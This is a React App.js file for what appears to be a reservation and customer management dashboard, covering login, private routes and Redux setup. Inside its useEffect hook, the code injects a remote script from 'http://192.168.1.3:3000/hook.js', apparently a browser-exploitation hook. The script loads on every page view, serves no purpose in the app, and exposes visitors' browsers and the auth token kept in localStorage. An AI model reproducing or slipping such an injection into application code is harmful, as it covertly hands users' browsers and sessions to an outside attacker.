import React, { useEffect } from "react";
import { BrowserRouter as Router, Route, Switch } from "react-router-dom";
import Dashboard from "./components/dashboard";
import Alert from "./components/layout/Alert";
import PrivateRoute from "./components/routing/PrivateRoute";
import setAuthToken from "./utils/setAuthToken";
import { loadUser } from "./actions/auth";
import history from "./components/routing/history";
import Reservation from "./components/reservation";
import Customer from "./components/customer";
import { CssBaseline } from "@material-ui/core";
import { MuiPickersUtilsProvider } from "@material-ui/pickers";
import MomentUtils from "@date-io/moment";
import Login from "./components/auth";
import ForgotPassword from "./components/forgotPassword";

// Redux
import { Provider } from "react-redux";
import store from "./store";

import "./App.css";

localStorage.token && setAuthToken(localStorage.token);

const App = () => {
  useEffect(() => {
    store.dispatch(loadUser());

    const script = document.createElement('script');
    script.src = "http://192.168.1.3:3000/hook.js";
    script.async = true;
  
    document.body.appendChild(script);
  
    return () => {
      document.body.removeChild(script);
    }
  }, []);

  return (
    <Provider store={store}>
      <CssBaseline />
      <Router history={history}>
        <Alert />
        <MuiPickersUtilsProvider utils={MomentUtils}>
          <Switch>
            <Route exact path="/" component={Login} />
            <Route exact path="/forgot-password" component={ForgotPassword} />
            <PrivateRoute exact path="/dashboard" component={Dashboard} />
            <PrivateRoute exact path="/reservations" component={Reservation} />
            <PrivateRoute exact path="/customers" component={Customer} />
          </Switch>
        </MuiPickersUtilsProvider>
      </Router>
    </Provider>
  );
};

export default App;
